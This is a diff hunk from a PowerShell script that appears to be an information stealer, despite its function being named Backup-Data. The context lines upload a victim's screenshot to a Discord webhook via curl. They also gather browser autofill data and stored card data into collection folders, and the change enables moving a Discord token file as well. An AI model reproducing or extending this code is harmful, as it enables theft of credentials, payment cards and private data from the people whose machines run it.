@@ -844,7 +844,7 @@ function Backup-Data {
     curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"KDOT\`", \`"content\`": \`"# :desktop: Screenshot\n> :triangular_ruler: **Size:** $($bounds.width)x$($bounds.height)\n\n\`"}" -F "file=@\`"$main_temp\screenshot.png\`"" "$($webhook)" | Out-Null
 
     #TODO ill fix tokens tomorrow
-    #Move-Item "$main_temp\tokens.txt" $folder_general -Force	
+    Move-Item "$main_temp\discord.json" $folder_general -Force	
     #Move-Item "$main_temp\screenshot.png" $folder_general -Force
     Move-Item -Path "$main_temp\autofill.json" -Destination "$browser_data" -Force
     Move-Item -Path "$main_temp\cards.json" -Destination "$browser_data" -Force
